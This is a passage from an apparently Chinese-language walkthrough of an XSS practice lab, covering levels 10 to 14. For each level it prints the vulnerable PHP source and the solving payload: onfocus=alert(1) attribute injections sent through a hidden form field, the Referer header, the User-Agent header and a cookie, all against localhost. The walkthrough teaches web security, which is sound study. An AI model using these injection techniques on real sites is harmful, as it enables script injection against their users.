class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level10<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">search</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">javascript:alert()</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level10.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:0<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>此时的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">javascript:alert()</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>新的type&#x3D;”text”就覆盖了原来的type，就能让输入框显示出来了  </p><p>隐藏的input标签可以插入type&#x3D;”text”显示 </p><p>ai的解释：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elm">即使最终 <span class="hljs-type">DOM</span> 中有两个 <span class="hljs-keyword">type</span>，但只要浏览器曾经把它当作 text 处理，它就可能：<br><br>在页面上占据空间<br>可以获得焦点<br>可以触发 onfocus<br>而 onfocus 事件不依赖 <span class="hljs-keyword">type</span> 最终值，只要元素能获得焦点即可。<br></code></pre></td></tr></table></figure><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>先看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level12.php?keyword=good job!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level11&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>看到$str和$str00都会被转义，但http报头会被引用？<br>那注入点就是在报头了，和ai沟通一波，<br>最后再把上一题的payload拿来用，在http报头加上payload:  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Referer</span>: &#x27;<span class="hljs-string">&quot; onfocus=&quot;</span>alert(<span class="hljs-number">1</span>)<span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; &quot;</span><br></code></pre></td></tr></table></figure><h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>依旧先偷看一眼源码：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level13.php?keyword=good job!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level12&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html<br></code></pre></td></tr></table></figure><p>依旧报头注入，这次变成USER_AGENT了<br>也是直接拿上题payload来用：  </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/level12.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>&#x27;&quot; onfocus=&quot;alert(1)&quot; type=&quot;text&quot; &quot;<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br></code></pre></td></tr></table></figure><h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>进页面先有个php语法报错：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level14.php&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level13&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;<br>&lt;br /&gt;<br>&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent <span class="hljs-title function_ invoke__">by</span> (output started at /<span class="hljs-keyword">var</span>/www/html/level13.<span class="hljs-attr">php</span>:<span class="hljs-number">1</span>) in &lt;b&gt;/<span class="hljs-keyword">var</span>/www/html/level13.php&lt;/b&gt; on line &lt;b&gt;<span class="hljs-number">16</span>&lt;/b&gt;&lt;br /&gt;<br>&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;<br>&lt;form id=search&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_link&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_history&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_sort&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_cook&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;<br>&lt;h3 align=center&gt;payload的长度:<span class="hljs-number">0</span>&lt;/h3&gt;&lt;/body&gt;<br>&lt;/html&gt;<br>```  <br>  <br>看样子是无法解析报头  <br><br>开源码看看：<br><br>```php<br>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level14.php&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level13&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;call me maybe?&quot;</span>, <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;user&quot;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>e，是cookie吗<br>那在cookie注入即可：  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /level13.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">sec</span>-ch-ua: <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;129&quot;</span>, <span class="hljs-string">&quot;Not=A?Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span><br><span class="hljs-attribute">sec</span>-ch-ua-mobile: ?<span class="hljs-number">0</span><br><span class="hljs-attribute">sec</span>-ch-ua-platform: <span class="hljs-string">&quot;Windows&quot;</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Sec</span>-Fetch-Site: none<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><span class="hljs-attribute">Cookie</span>: user=&#x27;%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>onfocus%<span class="hljs-number">3</span>d%<span class="hljs-number">22</span>alert(<span class="hljs-number">1</span>)%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>type%<span class="hljs-number">3</span>d%<span class="hljs-number">22</span>text%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>%<span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>这关加载了一个奇怪的图片？  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;title&gt;欢迎来到level14&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;<br>&lt;center&gt;&lt;iframe name=<span class="hljs-string">&quot;leftframe&quot;</span> marginwidth=<span class="hljs-number">10</span> marginheight=<span class="hljs-number">10</span> src=<span class="hljs-string">&quot;http://www.exifviewer.org/&quot;</span> frameborder=no width=<span class="hljs-string">&quot;80%&quot;</span> scrolling=<span class="hljs-string">&quot;no&quot;</span> height=<span class="hljs-number">80</span>%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xss/level15.php?src=<span class="hljs-number">1</span>.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>看看源码吧：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;title&gt;欢迎来到level14&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;<br>&lt;center&gt;&lt;iframe name=<span class="hljs-string">&quot;leftframe&quot;</span> marginwidth=<span class="hljs-number">10</span> marginheight=<span class="hljs-number">10</span> src=<span class="hljs-string">&quot;http://www.exifviewer.org/&quot;</span> frameborder=no width=<span class="hljs-string">&quot;80%&quot;</span> 